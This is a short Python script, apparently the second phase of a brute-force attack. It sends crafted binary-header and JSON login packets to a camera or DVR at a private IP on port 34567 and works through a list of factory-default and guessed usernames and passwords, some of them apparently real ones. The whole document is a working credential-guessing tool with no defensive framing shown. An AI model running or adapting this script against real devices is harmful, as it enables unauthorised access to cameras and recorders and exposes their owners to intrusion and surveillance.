
import socket
import struct
import time
import hashlib
import json

# Advanced Login: Sometimes Session ID handling is strict or encryption type varies.
# Try "EncryptType":"NONE"

def try_advanced(ip, port, user, password, enc_type="MD5"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2.0)
    try:
        sock.connect((ip, port))
    except: return False, "Conn Fail"

    pass_str = password
    if enc_type == "MD5" and password:
        pass_str = hashlib.md5(password.encode()).hexdigest().upper()
        
    # Payload JSON
    json_body = '{"EncryptType":"%s","LoginType":"cn","PassWord":"%s","UserName":"%s"}\n' % (enc_type, pass_str, user)
    body_bytes = json_body.encode()
    
    header = struct.pack("<BB2sIIIIHH", 0xFF, 0x01, b'\x00\x00', 0, 0, len(body_bytes), len(body_bytes), 1000, 0)
    sock.send(header + body_bytes)
    
    try:
        resp = sock.recv(1024)
        if len(resp) >= 20: return True, resp[20:].decode(errors='ignore')
    except: pass
    sock.close()
    return False, "No Resp"

print("--- BRUTE FORCE FASE 2 ---")
# Tentar usuario 'system', 'service', e senha do usuário como admin
cases = [
   ("admin", "viguera2001", "NONE"), # Plaintext with NONE type
   ("berbert", "viguera2001", "NONE"),
   ("System", "", "MD5"),
   ("666666", "", "MD5"), # Default user for some XM boards
   ("888888", "", "MD5"),
   ("admin", "111111", "MD5"), # General defaults
   ("admin", "12345", "MD5"),
   ("admin", "pass", "MD5"),
]

for u, p, e in cases:
    print(f"User: {u} | Pass: {p} | Enc: {e} -> ", end="")
    ok, msg = try_advanced("192.168.3.27", 34567, u, p, e)
    print(msg.strip())
